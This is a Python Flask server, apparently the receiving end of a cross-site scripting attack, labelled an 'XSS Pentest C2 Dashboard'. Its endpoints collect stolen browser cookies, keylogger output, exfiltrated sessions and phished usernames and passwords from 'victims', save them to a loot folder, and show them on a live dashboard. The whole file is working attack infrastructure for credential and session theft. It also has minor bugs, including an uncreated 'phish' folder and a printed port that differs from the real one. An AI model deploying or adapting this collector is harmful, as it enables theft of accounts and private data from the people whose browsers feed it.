from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
import os
import time
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
CORS(app)

# Data storage
LOOT_DIR = Path("loot")
LOOT_DIR.mkdir(exist_ok=True)
for subdir in ["cookies", "keys", "sessions"]:
    (LOOT_DIR / subdir).mkdir(exist_ok=True)

def get_timestamp():
    return datetime.now().strftime("%Y%m%d-%H%M%S")

def save_loot(subdir, data):
    """Save data to timestamped JSON file"""
    filename = f"{LOOT_DIR}/{subdir}/{get_timestamp()}.json"
    with open(filename, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Saved to {filename}")
    return filename

# 1. Cookie Stealer
@app.route('/steal')
def steal_cookies():
    data = {
        "timestamp": get_timestamp(),
        "victim_ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "cookies": request.args.get("cookie", ""),
        "url": request.args.get("url", ""),
        "referer": request.headers.get("Referer", "")
    }
    
    # Decode base64 cookie
    try:
        import base64
        data["cookies_decoded"] = base64.b64decode(data["cookies"]).decode() if data["cookies"] else ""
    except:
        pass
    
    save_loot("cookies", data)
    print(f"[+] Cookie stolen from {request.remote_addr}")
    return "OK"

# 2. Keylogger
@app.route('/log', methods=['POST', 'GET'])
def keylog():
    data = {
        "timestamp": get_timestamp(),
        "victim_ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
    }
    
    # Handle POST body OR GET params
    if request.data:
        data["keys"] = request.data.decode()
    else:
        data["keys"] = request.args.get("keys", "")
    
    save_loot("keys", data)
    print(f"[+] {len(data['keys'])} keystrokes from {request.remote_addr}")
    return "OK"

# 3. Full Exfil
@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.json or {}
    data.update({
        "timestamp": get_timestamp(),
        "victim_ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "forms": []  # Add form scraping client-side
    })
    
    save_loot("sessions", data)
    print(f"[+] Full session from {request.remote_addr}")
    return "OK"

@app.route('/phish')
def phish_creds():
    data = {
        "timestamp": get_timestamp(),
        "victim_ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "username": request.args.get("user", ""),
        "password": request.args.get("pass", ""),
        "data": request.args.get("data", "")  # Base64 fallback
    }
    
    # Decode base64 data if present
    if data["data"]:
        try:
            import base64
            decoded = base64.b64decode(data["data"]).decode()
            if ':' in decoded:
                data["username"], data["password"] = decoded.split(':', 1)
        except:
            pass
    
    save_loot("phish", data)
    print(f"[+] PHISH CREDS from {request.remote_addr}: {data['username']}")
    return "OK", 200

    
# 4. Live Dashboard
@app.route('/')
def dashboard():
    return """
<!DOCTYPE html>
<html>
<head>
    <title>XSS C2 Dashboard</title>
    <meta http-equiv="refresh" content="10">
    <style>body{font-family:monospace;background:#1a1a1a;color:#00ff00}</style>
</head>
<body>
    <h1>🚀 XSS Pentest C2 Dashboard</h1>
    <div id="stats"></div>
    <script>
    async function refresh(){
        const r=await fetch('/api/stats');
        const stats=await r.json();
        document.getElementById('stats').innerHTML=`
            <h2>Recent Victims (${stats.victims.length})</h2>
            <pre>${stats.victims.map(v=>`IP: ${v.ip}\\nCookies: ${v.cookies.substring(0,100)}...`).join('\\n\\n')}</pre>
            <h2>Latest Keylogs</h2>
            <pre>${stats.keys.map(k=>k.keys.substring(0,200)+'...').join('\\n')}</pre>
            <h2>Sessions</h2>
            <pre>${JSON.stringify(stats.sessions.slice(0,3),null,2)}</pre>
        `;
    }
    refresh(); setInterval(refresh,10000);
    </script>
</body>
</html>
    """

# 8. API Stats
@app.route('/api/stats')
def stats():
    def load_recent(dir, max_files=10):
        files = sorted(Path(f"loot/{dir}").glob("*.json"), reverse=True)[:max_files]
        return [json.load(open(f)) for f in files]
    
    cookies = load_recent("cookies", 10)
    keys = load_recent("keys", 5)
    sessions = load_recent("sessions", 3)
    
    victims = cookies[:5]
    
    return jsonify({
        "victims": victims,
        "cookies": cookies,
        "keys": keys,
        "sessions": sessions,
        "total_cookies": len(list(Path("loot/cookies").glob("*.json"))),
        "total_keys": len(list(Path("loot/keys").glob("*.json")))
    })

if __name__ == '__main__':
    print("🚀 Flask C2 Server Starting...")
    print("📁 Loot → ./loot/")
    print("🌐 Dashboard → http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5001, debug=False)